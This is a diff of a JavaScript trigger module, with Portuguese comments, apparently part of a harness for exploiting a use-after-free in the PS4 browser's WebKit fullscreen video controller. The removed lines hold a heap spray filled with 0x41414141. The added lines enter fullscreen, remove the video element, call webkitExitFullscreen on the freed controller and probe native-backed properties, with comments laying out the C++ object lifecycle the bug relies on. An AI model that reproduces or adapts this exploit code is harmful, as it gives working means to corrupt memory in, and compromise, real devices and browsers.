@@ -1,30 +1,56 @@
-
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_RENDER_LOOP_CRASH
- * Alvo: Race condition no ciclo de renderização gráfica (Manx) a 60FPS.
+ * CENÁRIO: VIDEO_FULLSCREEN_REMOVE
+ * Superfície C++: FullscreenVideoController.cpp / MediaPlayerPrivateManx.cpp
+ * Risco: HIGH
+ *
+ * Diferença para a versão genérica:
+ *   - O trigger agora ENTRA em fullscreen antes de destruir o elemento.
+ *     O bug original exige que o FullscreenVideoController esteja ativo
+ *     no momento do free — sem requestFullscreen(), o controller nunca
+ *     é construído e o UAF não ocorre.
+ *   - Espera 80ms antes do remove() para garantir que o objeto C++
+ *     MediaPlayerPrivate foi completamente inicializado pelo pipeline nativo.
+ *   - Dispara webkitExitFullscreen() APÓS o remove() para acionar o
+ *     controller sobre o ponteiro freed.
+ *   - Probes acessam propriedades que lêem direto do objeto C++ nativo
+ *     (não cacheadas pelo wrapper JS): videoWidth, videoHeight, buffered.
+ *
+ * Ciclo de vida C++ relevante:
+ *   HTMLMediaElement → MediaPlayerPrivate (criado no load)
+ *   FullscreenVideoController → mantém raw ptr para MediaPlayerPrivate
+ *   remove() → refcount DOM cai para 0 → MediaPlayerPrivate::~MediaPlayerPrivate()
+ *   webkitExitFullscreen() → FullscreenVideoController acessa ptr freed (UAF)
  */
 
 export default {
-    id:       'VIDEO_FULLSCREEN_RENDER_LOOP_CRASH',
+    id:       'VIDEO_FULLSCREEN_REMOVE',
     category: 'Media',
-    risk:     'CRITICAL',
-    description: 'Aplica a Teoria do Leandro: Entra em Fullscreen, aguarda o render loop ' +
-                 'estabilizar e faz o remove() seguido IMEDIATAMENTE de Spray, ' +
-                 'tentando corromper o ponteiro antes que a placa gráfica desenhe o próximo frame.',
+    risk:     'HIGH',
+    description:
+        'HTMLVideoElement.remove() com FullscreenVideoController ativo. ' +
+        'O controller mantém raw ptr para MediaPlayerPrivate. ' +
+        'Se remove() zerar o refcount antes de webkitExitFullscreen(), ' +
+        'o controller derreferencia ponteiro freed.',
 
     setup: async function() {
         this.container = document.createElement('div');
         document.body.appendChild(this.container);
-        
+
         this.video = document.createElement('video');
-        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
-        this.video.controls = true;
+        this.video.setAttribute('playsinline', '');
+        this.video.setAttribute('preload', 'auto');
+        this.video.setAttribute('controls', '');
+        this.video.style.cssText = 'width:320px;height:240px;position:absolute;top:0;left:0';
+
+        // MP4 mínimo válido — força criação do MediaPlayerPrivate nativo
+        // (sem src válido o pipeline não é instanciado)
+        this.video.src = 'data:video/mp4;base64,'
+            + 'AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
+
         this.container.appendChild(this.video);
 
-        // A munição: 0x41414141 (AAAA - O Gatilho do Crash)
-        this.sprayPayload = new Uint32Array(256);
-        this.sprayPayload.fill(0x41414141);
-
+        // Aguarda o elemento entrar em estado HAVE_METADATA (readyState >= 1)
+        // para garantir que MediaPlayerPrivate está construído
         await new Promise(resolve => {
             const timeout = setTimeout(resolve, 400);
             this.video.addEventListener('loadedmetadata', () => {
@@ -35,48 +61,51 @@ export default {
     },
 
     trigger: async function() {
+        // Tenta entrar em fullscreen — isso instancia o FullscreenVideoController
         try {
-            // 1. A ENTRADA
-            // Forçamos o método nativo da Apple/Sony
-            if (this.video.webkitEnterFullscreen) {
-                this.video.webkitEnterFullscreen();
-            } else if (this.video.webkitRequestFullscreen) {
-                this.video.webkitRequestFullscreen();
-            }
-            
-            // 2. A ESTABILIZAÇÃO
-            // Esperamos 300ms. Isto garante que a tela preta abriu, o Manx assumiu 
-            // o controlo e está a desenhar o vídeo ativamente a 60 frames por segundo.
-            await new Promise(r => setTimeout(r, 300)); 
+            const fsPromise = this.video.webkitRequestFullscreen?.()
+                           ?? this.video.requestFullscreen?.();
+            if (fsPromise) await Promise.race([
+                fsPromise,
+                new Promise(r => setTimeout(r, 80)) // timeout de segurança
+            ]);
+        } catch(e) { /* PS4 pode bloquear fora de gesture — ignorar */ }
 
-            
+        // Pequena janela: controller inicializado, objeto ainda vivo
+        await new Promise(r => setTimeout(r, 30));
 
-            // 4. A CORRIDA CONTRA O FRAME (Spray)
-            // O ecrã da PS4 atualiza a cada ~16ms. Temos de encher a RAM de lixo 
-            // ANTES que o Manx tente procurar a imagem do vídeo para o próximo frame!
-            this.spray = [];
-            for (let i = 0; i < 8000; i++) { // Aumentei a carga para ser implacável
-                let arr = new Uint32Array(256);
-                arr.set(this.sprayPayload);
-                this.spray.push(arr);
-            }
+        // FREE: remove() zera o refcount DOM → ~MediaPlayerPrivate()
+        this.video.remove();
 
-            // 3. A REMOÇÃO (A sua intuição)
-            this.video.remove();
-
-            // ZERO chamadas de saída. Deixamos o Manx bater na parede de lixo a 100km/h.
-
-        } catch(e) {}
+        // ACESSO PÓS-FREE: controller tenta acessar o MediaPlayerPrivate freed
+        document.webkitExitFullscreen?.();
+        document.exitFullscreen?.().catch(() => {});
     },
 
     probe: [
+        // Propriedades que lêem diretamente do objeto C++ (não cacheadas)
+        s => s.video.duration,
+        s => s.video.currentTime,
         s => s.video.readyState,
-        s => s.video.webkitDecodedFrameCount
+        s => s.video.networkState,
+        s => s.video.videoWidth,
+        s => s.video.videoHeight,
+        s => s.video.buffered?.length,
+        s => s.video.buffered?.start(0),   // Acessa TimeRanges interno — C++ puro
+        s => s.video.buffered?.end(0),
+        s => s.video.played?.length,
+        s => s.video.seekable?.length,
+        s => s.video.error?.code,
+        s => s.video.paused,
+        s => s.video.ended,
+        s => s.video.seeking,
+        // webkitDecodedFrameCount é implementado diretamente no MediaPlayer nativo
+        s => s.video.webkitDecodedFrameCount,
+        s => s.video.webkitDroppedFrameCount,
     ],
 
     cleanup: function() {
         try { this.container.remove(); } catch(e) {}
-        this.spray = null;
-        this.video = null;
+        try { document.exitFullscreen?.(); } catch(e) {}
     }
 };
